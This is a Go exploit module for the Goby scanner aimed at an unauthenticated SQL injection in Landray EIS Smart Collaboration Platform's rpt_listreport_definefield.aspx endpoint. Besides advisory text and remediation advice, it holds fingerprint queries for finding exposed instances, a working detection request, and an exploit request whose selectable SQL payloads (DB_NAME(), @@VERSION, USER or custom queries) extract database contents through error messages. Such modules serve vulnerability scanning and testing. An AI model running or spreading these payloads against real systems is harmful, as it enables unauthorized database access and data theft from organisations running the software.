package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Landray EIS Smart Collaboration Platform /SM/rpt_listreport_definefield.aspx SQL Injection Vulnerability",
    "Description": "<p>Landray EIS Smart Collaboration Platform is a product designed to provide efficient collaborative office and teamwork for enterprises. This vulnerability exists in the rpt_listreport_definefield.aspx interface, where user input is not properly filtered or validated, allowing attackers to craft malicious requests to exploit this vulnerability and obtain sensitive database information.</p>",
    "Product": "Landray EIS Smart Collaboration Platform",
    "Homepage": "https://www.landray.com.cn/",
    "DisclosureDate": "2024-03-04",
    "PostTime": "2024-12-12",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"/scripts/jquery.landray.common.js\" || body=\"v11_QRcodeBar clr\" || title=\"智慧协同平台\" && body=\"欢迎登录智慧协同平台\" ||body=\"欢迎登录智慧协同平台\"",
    "GobyQuery": "body=\"/scripts/jquery.landray.common.js\" || body=\"v11_QRcodeBar clr\" || title=\"智慧协同平台\" && body=\"欢迎登录智慧协同平台\" ||body=\"欢迎登录智慧协同平台\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows unauthenticated attackers to obtain sensitive database information through SQL injection, potentially leading to data leakage, system integrity compromise, and further attacks.</p>",
    "Recommendation": "<p>It is recommended that affected users immediately contact the vendor to obtain the latest patches and strictly filter and validate user input to prevent SQL injection attacks. Additionally, enabling security measures such as WAF (Web Application Firewall) is advised to enhance system protection.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/136457781"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "DB_NAME(), @@VERSION,USER",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "DB_NAME()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{{randnum}}}')),3,32)--",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/SM/rpt_listreport_definefield.aspx?ID=2%20and%201='112233'%2B({{{payload_encode}}})%2B'332211'--",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|112233([^'][\\s\\S]*?)332211",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "蓝凌EIS智慧协同平台 /SM/rpt_listreport_definefield.aspx SQL 注入漏洞",
            "Product": "蓝凌EIS智慧协同平台",
            "Description": "<p>蓝凌EIS智慧协同平台是一款专为企业提供高效协同办公和团队合作的产品。该漏洞存在于 rpt_listreport_definefield.aspx 接口处，由于未对用户输入的SQL语句进行过滤或验证，攻击者可以通过构造恶意请求，利用此漏洞获取数据库敏感信息。</p>",
            "Recommendation": "<p>建议受影响用户立即联系厂商获取最新补丁，并对用户输入进行严格的过滤和验证，防止SQL注入攻击。同时，建议启用WAF（Web应用防火墙）等安全措施以增强系统防护。</p>",
            "Impact": "<p>该漏洞允许未经身份验证的攻击者通过SQL注入获取数据库敏感信息，可能导致数据泄露、系统完整性破坏以及进一步的攻击。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Landray EIS Smart Collaboration Platform /SM/rpt_listreport_definefield.aspx SQL Injection Vulnerability",
            "Product": "Landray EIS Smart Collaboration Platform",
            "Description": "<p>Landray EIS Smart Collaboration Platform is a product designed to provide efficient collaborative office and teamwork for enterprises. This vulnerability exists in the rpt_listreport_definefield.aspx interface, where user input is not properly filtered or validated, allowing attackers to craft malicious requests to exploit this vulnerability and obtain sensitive database information.</p>",
            "Recommendation": "<p>It is recommended that affected users immediately contact the vendor to obtain the latest patches and strictly filter and validate user input to prevent SQL injection attacks. Additionally, enabling security measures such as WAF (Web Application Firewall) is advised to enhance system protection.</p>",
            "Impact": "<p>This vulnerability allows unauthenticated attackers to obtain sensitive database information through SQL injection, potentially leading to data leakage, system integrity compromise, and further attacks.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}",
        "randnum": "define|variable|{{{rand|int|6}}}",
        "md5": "define|md5|{{{randnum}}}"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode",
        "randnum",
        "md5"
    ],
    "EditType": "fast",
    "PocId": "9977"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}